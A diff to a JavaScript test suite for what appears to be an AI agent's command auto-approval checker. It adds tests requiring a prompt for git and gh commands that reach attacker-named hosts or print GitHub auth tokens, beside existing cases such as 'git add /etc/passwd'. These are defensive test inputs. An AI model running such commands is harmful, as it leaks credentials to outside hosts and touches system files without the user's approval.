@@ -198,6 +198,17 @@ describe('assessAutoApproval — destructive git forms', () => {
     prompts('git remote set-url origin https://attacker.example/x')
   })
 
+  it('reads git remote show only for a configured remote, which it contacts', () => {
+    assert.equal(approved('git remote show origin', 'read'), 'read')
+    assert.equal(approved('git remote show', 'read'), 'read')
+    // git takes an unknown name as a URL and connects to it.
+    prompts('git remote show git@attacker:repo')
+    prompts('git remote show attacker.example:repo')
+    prompts('git remote show upstream')
+    prompts('git remote show origin', 'read', [])
+    assert.equal(approved('git remote get-url origin', 'read'), 'read')
+  })
+
   it('refuses git add outside the workspace', () => {
     prompts('git add /etc/passwd')
     prompts('git add ../other-project/file')
@@ -253,6 +264,8 @@ describe('assessAutoApproval — gh', () => {
       'gh api -H "X-HTTP-Method-Override: DELETE" repos/me/x',
       'gh api graphql -f query=q',
       'gh api https://evil.example/x',
+      'gh api --hostname attacker.example /path',
+      'gh api --hostname=attacker.example /path',
       'gh api repos/me/a repos/me/b',
     ]) {
       prompts(command)
@@ -562,6 +575,8 @@ describe('assessAutoApproval — secrets inside the workspace', () => {
   it('refuses gh auth status --show-token, which prints the token', () => {
     prompts('gh auth status --show-token', 'read')
     prompts('gh auth status -t', 'read')
+    prompts('gh auth status --show-token=true', 'read')
+    prompts('gh auth status -at', 'read')
     assert.equal(approved('gh auth status', 'read'), 'read')
   })
 })
